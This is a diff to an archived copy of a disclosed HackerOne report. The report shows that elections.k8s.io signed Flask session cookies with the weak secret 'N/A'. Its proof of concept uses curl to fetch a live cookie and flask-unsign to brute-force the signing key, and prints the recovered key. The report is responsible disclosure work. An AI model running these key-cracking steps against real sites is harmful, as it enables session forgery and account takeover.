@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "Cryptographic Issues - Generic"
 enriched: true
+body: true
 date: 2025-09-19
 submitted: 2021-11-01T07:23:57.089Z
 bounty_usd: 250
@@ -26,6 +27,43 @@ title: "elections.k8s.io uses weak session secret key, may place elections at ri
 - Report: [https://hackerone.com/reports/1387366](https://hackerone.com/reports/1387366)
 - CWE: Cryptographic Issues - Generic
 - Submitted: 2021-11-01T07:23:57.089Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary
+Hi there, I have been working on a new tool to detect misconfigured session signing across bug bounty programs, called CookieMonster. Many applications use stateless cookies to preserve session information (i.e. who has logged in), but many applications do not properly secure this. @nagli and I discovered that `elections.k8s.io` uses a weak Flask SECRET_KEY, literally the string `N/A`, to sign authentication cookies.
+
+In many applications, this allows the complete compromise of the application, as you can manipulate who you are logged in as. This would be especially problematic for an election voting system. It seems, in the case of Elekto, this may not be the case as the GitHub OAuth token is injected into the session instead of a user ID, which would be hard to obtain for another user. However, this may enable weird attacks like using cross-origin request forgery with the voting or authentication flows, as we would be able to manipulate the session which contains these tokens.
+
+Note the warning from [the Elekto source](https://github.com/elekto-io/elekto/blob/48573733858aace5bec38ee9dc73e45163518346/config.py) (this is what you have set to `N/A`):
+
+```python
+# Encryption Key
+#
+# This is used by the Flask server and should be set to a random character
+# string, please do not deploy before doing this!.
+SECRET_KEY = env('APP_KEY', 'test')
+```
+
+## PoC
+As CookieMonster is not yet public, you can also use `Flask-Unsign` (`pip3 install flask-unsign[wordlist]`) to validate this:
+```
+% curl https://elections.k8s.io -Is | grep cookie
+set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg; Expires=Thu, 02 Dec 2021 07:23:10 GMT; HttpOnly; Path=/
+
+% flask-unsign -u -c "eyJfcGVybWFuZW50Ijp0cnVlfQ.YX-V3g.NET76NNJbweb_qagyfYl2_7TDJg"
+[*] Session decodes to: {'_permanent': True}
+[*] No wordlist selected, falling back to default wordlist..
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 8192 attemptspdcQHNyXaB0O
+'N/A'
+```
+
+## Impact
+
+Weak secret likely allows arbitrary session manipulation
 
 ## Timeline
 
